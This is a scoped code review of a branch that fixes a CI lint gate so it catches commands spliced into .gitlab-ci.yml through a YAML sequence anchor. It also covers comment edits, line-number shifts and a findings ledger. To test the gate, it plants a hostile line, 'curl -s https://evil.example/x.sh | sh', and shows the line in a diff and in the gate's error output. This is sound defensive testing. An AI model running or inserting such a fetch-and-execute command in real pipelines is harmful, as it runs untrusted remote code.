# Scoped review — lane `workflow-gate`

Input: `git diff origin/master...lane/workflow-gate` and nothing else. Base
`d9d9252`, head `1c1bb6d`. Two commits, four files, `+30 / −8`.

```
 .github/workflows/image.yml     |  6 ++++--
 .github/workflows/scheduled.yml |  2 ++
 .gitlab-ci.yml                  |  8 ++++++++
 scripts/lint.sh                 | 22 ++++++++++++++++------
```

Plans under review: `docs/archive/plans/issue-82.md`, `docs/archive/plans/issue-90-pipeline-comments.md`.
Raw evidence they rest on: `docs/review/workflow-gate/reverify/RX-E4.txt`.

---

## Commit `4240756` — the flatten fix (`#82`)

### Lens 1 — did it do what the plan said?

Yes, and only that. The plan chose O2 (`issue-82.md:180-215`) and specified
`+16 / −6`, one file, one function, no new file, no change to `ok`, `uses_ok`,
`uses()`, the file list or the `justfile`. `git commit` reports
`1 file changed, 16 insertions(+), 6 deletions(-)`, and the diff is byte-identical
to `RX-E4.txt` M7's patch. Nothing in the diff is outside the plan.

Confirmed absent, each named as a non-goal in `issue-82.md:291-303`: no change to
the `ok` allowlist, no change to the diagnostic message, no edit to
`.gitlab-ci.yml`'s anchor, no `tests/` file.

### Lens 2 — does it have teeth?

Four cells, all run on the committed tree at `1c1bb6d` in a scratch copy
(`git archive HEAD`, `.venv` and `.tools` symlinked read-only). The only
difference between the two trees is one line inside the `.bootstrap` anchor:

```
$ diff -u pristine hostile
@@ -45,6 +45,7 @@
   - ./scripts/os-deps.sh
   - ./scripts/install-tools.sh
   - just dev-env
+  - curl -s https://evil.example/x.sh | sh
```

| gate | tree | `workflows carry no logic` | `just lint` exit |
|---|---|---|---|
| `origin/master`'s `lint.sh` | pristine | `ok` | 0 |
| `origin/master`'s `lint.sh` | **hostile** | **`ok`** | **0** |
| this branch's `lint.sh` | pristine | `ok` | 0 |
| this branch's `lint.sh` | **hostile** | **`FAIL`** | **1** |

Row 2 is the defect: the unpatched gate passes a `curl … | sh` that only has to
be written inside a sequence anchor. Row 4 is the fix. Row 3 is the risk this
option had to clear — the fix does not turn the committed tree red.

Row 4's stderr, verbatim:

```
        .gitlab-ci.yml: curl -s https://evil.example/x.sh | sh
        .gitlab-ci.yml: curl -s https://evil.example/x.sh | sh
        .gitlab-ci.yml: curl -s https://evil.example/x.sh | sh
        .gitlab-ci.yml: curl -s https://evil.example/x.sh | sh
  FAIL  workflows carry no logic
error: 1 gate(s) failed: workflows carry no logic
```

**Extractor counts**, re-measured here by loading `commands()` and `ok` out of
`scripts/lint.sh`'s heredoc rather than reimplementing them:

| file | before | after |
|---|---|---|
| `ci.yml` | 14 | 14 |
| `image.yml` | 8 | 8 |
| `scheduled.yml` | 7 | 7 |
| `.gitlab-ci.yml` | 17 | **29** |
| **total** | **46** | **58** |
| rejected by `ok.fullmatch` | 0 | **0** |

The +12 is four splice sites × three anchor lines. Zero rejected on both sides is
the reason the committed tree stays green.

**Merge-key regression, the plan's C5** (`issue-82.md:118-135`). Three fixtures,
run against both gates:

| fixture | `origin/master` | this branch |
|---|---|---|
| `<<: *tpl`, template carries `script:` | caught | caught |
| `<<: [*a, *b]` multi-merge | caught | caught |
| `<<: *tpl`, template splices a sequence alias | **missed** | **caught** |

Two preserved, one gained. Nothing regressed.

**`just check`** on the tree at this commit: six lint gates ok, `ty` clean,
`411 passed, 25 skipped` — the baseline number, unchanged, which is expected
because no test imports `commands()`.

### Lens 3 — what moved?

`scripts/lint.sh` grew 10 lines; everything from old `:72` onward shifts `+10`.

| anchor | before | after |
|---|---|---|
| `workflows_carry_no_logic()` | `:40-114` | **`:40-124`** |
| `lines()` | — | **`:61-74`** (new) |
| `commands()` | `:61-76` | **`:76-86`** |
| the defective list branch | `:68-71` | gone; one line at `:81` |
| `uses()` | `:79-89` | `:89-99` |
| `main()` | `:116` | `:126` |
| `gate "ruff check"` / `"ruff format"` | `:126` / `:127` | `:136` / `:137` |
| `gate "hadolint"` / `"tofu fmt"` | `:149` / `:150` | `:159` / `:160` |
| `gate "shellcheck"` | `:183` | `:193` |
| `gate "workflows carry no logic"` | `:189` | `:199` |
| the four `-o` flags | `:183-187` | `:193-197` |
| file length | 197 | 207 |

Unmoved, because they sit above the change: the gate's own header comment at
`:31-33`, `ok` at `:53`, `uses_ok` at `:58`.

**What points at the moved numbers.** `grep -rn 'lint\.sh:[0-9]'` over the repo:

* **`CLAUDE.md:39` — `scripts/lint.sh:34-77` (`workflows_carry_no_logic`).**
  Live document, and now wrong by more than it was. It was already wrong at
  `origin/master`, where the function is `:40-114`; this branch makes the correct
  range **`:40-124`**. Not fixed here — `CLAUDE.md` is outside this lane's file
  set. **A later lane re-anchors it to `scripts/lint.sh:40-124`.**
* `docs/research/tooling-2026-08-30.md:258,361,786,813` and every citation under
  `docs/review/2026-08-30/` and `docs/review/2026-08-31/` are dated documents.
  This repo does not edit a dated survey or review after filing
  (`docs/review/2026-08-31/ledger/a-issues-8-40.md:28` records the rule), so they
  are left. Two of them now describe a defect that no longer exists —
  `finders/E-build-pipeline.md:61` and `verify/E-mediums.md:96` both cite
  `lint.sh:68-71`, which this commit deletes. The correction lives in the commit
  body, which is where CLAUDE.md says it belongs.
* `docs/archive/plans/issue-82.md` cites the pre-change numbers throughout. Correct for a
  plan; it describes the tree it was written against.

Nothing under `orchestrator/`, `tests/`, `container/`, `justfile` or
`.claude/settings.json` cites a `lint.sh` line number.

---

## Commit `1c1bb6d` — the two pipeline comments (`#90`, 2 of 11)

### Lens 1 — did it do what the plan said?

Substantially yes, with **one deviation, recorded below.**

* `image.yml:60-61` → the plan's four-line replacement, verbatim
  (`issue-90-pipeline-comments.md:88-95`). The `fetch-depth: 0` setting is
  untouched, which is what §Item 1 measured and decided.
* `scheduled.yml` gets a comment where it had none. The plan
  (`issue-90-pipeline-comments.md:99-101`) asks for "the same treatment or a
  one-line pointer at `image.yml`". **Landed as a two-line pointer that names
  `image.yml` but carries no line number** — one line does not fit the text, and
  a line number here would be the exact defect the commit is fixing.
* `.gitlab-ci.yml:10-18` gets the plan's eight-line third assumption
  (`issue-90-pipeline-comments.md:180-189`), with **one word changed: the
  self-citation `:162-164` is written as `:170-172`.**

**The deviation, and why.** The plan's proposed text ends with *"the artifact the
comment at `:162-164` calls 'what makes the rest of this job worth running'"*.
`:162-164` was correct when the plan was written and is invalidated by the plan's
own eight-line insertion, which pushes that comment to `:170-172`. Landing the
text unchanged would have shipped a stale citation inside a commit whose subject
is stale citations. Verified after the edit:

```
$ awk 'NR>=170&&NR<=173' .gitlab-ci.yml
170	  # What makes the rest of this job worth running: `just scan` otherwise writes
171	  # trivy.json, the SBOM and the archive into the runner's .cache/ and the runner
172	  # deletes them. Mirrors the upload-artifact step in .github/workflows/.
173	  artifacts:
```

This is arithmetic the plan could not do before the insertion existed, not a
different fix. It is still a self-referential line number and is raised as F1.

Confirmed absent, each a non-goal in `issue-90-pipeline-comments.md:213-218`: no
`fetch-depth` change in either workflow, no `artifacts:exclude`, no
`artifacts:max_size`, no `expire_in` change, no split of the delivery bundle.
Nothing from the other nine `#90` items is touched.

### Lens 2 — does it have teeth?

A comment edit has no gate of its own, so the question is what could have gone
wrong and what says it did not.

1. **The GitLab edit is not vacuous under `just lint`.** `workflows_carry_no_logic`
   parses `.gitlab-ci.yml` with PyYAML, so a comment block that breaks the parse
   fails the gate rather than being ignored. It parses: `ok workflows carry no
   logic`, and the extractor still yields 29 from that file.
2. **No command count moved.** After both commits: `ci.yml` 14, `image.yml` 8,
   `scheduled.yml` 7, `.gitlab-ci.yml` 29, total 58, 0 rejected — identical to
   the numbers measured before the comment edits. A comment edit that changed a
   count would mean it had landed inside a `script:` block.
3. **`just check`**: six lint gates ok, `ty` clean, `411 passed, 25 skipped`.

The claims the new comments make were measured rather than reasoned about, in
`RX-E4.txt`: a `--depth 1` clone gives `rev-parse HEAD` and `status --porcelain`
byte-identical output to full history in every scenario including the `-dirty`
suffix; `.cache/delivery/` is 160,195,828 bytes; GitLab's 100 MB default applies
to the final archive. That last one is documentation, and the comment says so in
its own text.

### Lens 3 — what moved?

`.gitlab-ci.yml` grew 8 lines; everything from old `:17` onward shifts `+8`.
`image.yml` and `scheduled.yml` grew 2 each, shifting from old `:62` and old
`:46`.

| anchor | before | after |
|---|---|---|
| `.gitlab-ci.yml` `.bootstrap: &bootstrap` | `:36` | `:44` |
| `.gitlab-ci.yml` the four `- *bootstrap` splices | `:49,74,156,187` | `:57,82,164,195` |
| `.gitlab-ci.yml` `check:` / `tofu:` / `smoke:` | `:41` / `:52` / `:87` | `:49` / `:60` / `:95` |
| `.gitlab-ci.yml` `image:` / `rebuild-scan:` | `:116` / `:175` | `:124` / `:183` |
| `.gitlab-ci.yml` the two `artifacts:` blocks | `:165-169`, `:195-199` | **`:173-177`, `:203-207`** |
| `.gitlab-ci.yml` "Not `*bootstrap`" comment | `:106-109` | `:114-117` |
| `.gitlab-ci.yml` file length | 200 | 208 |
| `image.yml` `fetch-depth: 0` | `:64` | `:66` |
| `image.yml` `upload-artifact` step | `:90-94` | `:92-96` |
| `image.yml` `- run: just image` | `:73` | `:75` |
| `image.yml` file length | 94 | 96 |
| `scheduled.yml` `fetch-depth: 0` | `:48` | `:50` |
| `scheduled.yml` `upload-artifact` step | `:77` | `:79` |
| `scheduled.yml` file length | 82 | 84 |

**What points at the moved numbers.** `grep -rn` for
`gitlab-ci\.yml:[0-9]|image\.yml:[0-9]|scheduled\.yml:[0-9]`: every hit is inside
a dated survey or review (`docs/research/tooling-2026-08-30.md`,
`docs/review/2026-08-30/`, `docs/review/2026-08-31/`) or this lane's own plans.
No live document — no `CLAUDE.md`, `README.md`, `docs/ci.md`, script or test —
cites a line number in any of the three pipeline files. Three review hits are
now doubly stale and are named in the commit body so whoever closes `#90` has
the current numbers: `finders/E-build-pipeline.md:131` and `verify/E-lows.md:88`
cite the `artifacts:` blocks as `:131-135` / `:161-165` (`672a500` numbers, then
`:165-169` / `:195-199` at `origin/master`, now `:173-177` / `:203-207`), and
`verify/E-lows.md:110` cites `scheduled.yml:47-48` (now `:49-50`).

| `.gitlab-ci.yml` `smoke`'s longhand script | `:110-114` | `:118-122` |

Two citations this branch creates and then moves. The one it *keeps* moving is
`.gitlab-ci.yml`'s new `:170-172`, inside the same file it points into — F1. The
other is commit `4240756`'s own body, which cites `smoke`'s longhand as
`.gitlab-ci.yml:110-114`; `1c1bb6d` lands after it and shifts that to `:118-122`.
That one is left, and is not a defect: a commit body describes the tree at its
commit, and `git show 4240756:.gitlab-ci.yml` has the longhand at `:110-114`.

---

## Ledger

### Raised

| | |
|---|---|
| **F1** | `.gitlab-ci.yml`'s new runner assumption cites `:170-172` *within the same file*. Correct as landed and verified, but any future insertion above line 170 breaks it silently — the defect class `#90` exists to catalogue. The plan's own text shipped this number one insertion out of date, which is the evidence that it will happen again. Cheap alternative if it recurs: name the comment by its wording instead of its line, as `docs/review/2026-08-31/ledger/a-issues-8-40.md:35` records was done for `lint.sh`'s hadolint ignores. Not changed here — the plan asked for the numeric form and this is the plan's text with the arithmetic corrected. |
| **F2** | `CLAUDE.md:39` cites `scripts/lint.sh:34-77` for `workflows_carry_no_logic`. Already wrong at `origin/master` (`:40-114`); this branch makes the correct range **`:40-124`**. Out of this lane's file set, so not fixed. Independently found before this branch — `docs/review/2026-08-31/verify/F-lows.md:23`. |
| **F3** | The patched gate prints the offending line **four times**, once per splice site, and the message names no job. `issue-82.md:225-232` accepted this: the machinery to dedupe or path-track is more surface than the wart. Recorded so it is not re-derived as a new finding. |
| **F4** | Nothing in `tests/` exercises this gate — `grep -rn 'workflows_carry_no_logic\|lint\.sh\|gitlab-ci\|\.github' tests/` still has no match. `issue-82.md:255-274` offered `tests/test_workflow_gate.py` (four cases, ~60 lines) as additional surface and declined it; declined here for the same reason. The consequence is live: a future edit to `lines()` has no automated guard, and `just check` is green with the defect present and green with it fixed. |

### Confirmed

* `#82`'s **symptom**, exactly: a hostile command inside `.bootstrap` passes the
  gate at `origin/master`; the identical string as a direct `script:` entry fails
  it. Four-cell matrix above.
* `#82` stays **medium**. Nothing ships wrong today — all three `.bootstrap`
  lines are on the allowlist and `.github/workflows/` has no anchors — but
  `.gitlab-ci.yml:6-8` plans to delete `.github/`, after which the only pipeline
  file is the one whose bootstrap was unchecked.
* `#90`'s `image.yml` verdict: the comment is false and the setting should stay.
  `--depth 1` byte-identical in every scenario; ~100 ms on a 2m36s-2m54s job.
* `#90`'s sizes: `.cache/delivery/` 160,195,828 bytes = 152.8 MiB; tarball
  150,804,892 bytes. Its "153 MiB" and "151 MB" both hold.
* The plan's counts, re-measured independently here: 46 → 58, per file
  14/8/7/29, 0 rejected on both sides.

### Refuted

| | |
|---|---|
| **`#82`'s stated mechanism** | "The extractor … never resolves anchors" is wrong. `safe_load` resolves them before `commands()` runs, and by identity: `check.script[0] is gitlab['.bootstrap']` is `True`. The defect is that `.bootstrap` is a **sequence**, so `- *bootstrap` splices a list into a list. Anchors are not the problem; list nesting is. Corrected in the commit body, per CLAUDE.md. |
| **The review's prescribed remedy** | `finders/E-build-pipeline.md` and `verify/E-mediums.md` both propose `yield from commands(item)` in the list branch, "two lines and adds no surface". **Measured 46 → 46, hostile line still passes.** `commands()` never yields a bare string outside a `script:` context, so `commands(['a','b'])` recurses to `commands('a')` and yields nothing. Rejected; the fix is the separate `lines()` helper. |
| **`#90`'s cap framing** | The 100 MB GitLab default is not a per-file cap. It "applies to the size of the final archive file, not individual files in a job", so the comparison is 100 MB against the whole 160 MB directory. Conclusion unchanged and marginally stronger — splitting the tarball out still would not clear the cap. |
| **`#82`'s count** | "13 commands and none of the three bootstrap lines" was exact at `672a500`. At `origin/master` it is **17**, and two of the three bootstrap lines *are* checked, via the `smoke` job's longhand at `.gitlab-ci.yml:110-114`. Only `just dev-env` was invisible to every file. |
| **Two `#90` citations** | The second git call is `scripts/lib.sh:140`, not `:135` — `454ee7c` inserted a five-line comment at `:135-139`. And `#90` cites `.gitlab-ci.yml:10-18` as if the block carried a false claim; it does not, the block is correct and the defect is an omission beside it. |

### Downgraded

| | |
|---|---|
| Dropping `fetch-depth: 0` | From "a setting to change" to "a comment to correct". `#90` already said keep the setting; the measurement is now in the tree. ~100 ms against a 30-minute ceiling, and removing it reintroduces the possibility that a later step wants history. |
| `#82`'s repair as "two lines in the list branch" | From a two-line edit to a `+16 / −6` helper. Not scope creep: the two-line form was measured as a no-op. |
| `tests/test_workflow_gate.py` | From the plan's optional fourth deliverable to not built. See F4 — this is a deliberate acceptance of the gap, not an oversight. |

### Nothing closed by this branch

`Closes #82` is in commit `4240756`. **`#90` stays open** — commit `1c1bb6d`
closes two of its eleven items and carries no `Closes` trailer. The remaining
nine are in `docs/cve-baseline.json`, `scripts/lib.sh`, `container/entrypoint.py`,
`orchestrator/backends/libvirt/{destroy.py,tofu/variables.tf}`,
`orchestrator/cli.py` twice and `docs/findings.md`, plus the stale baseline row.
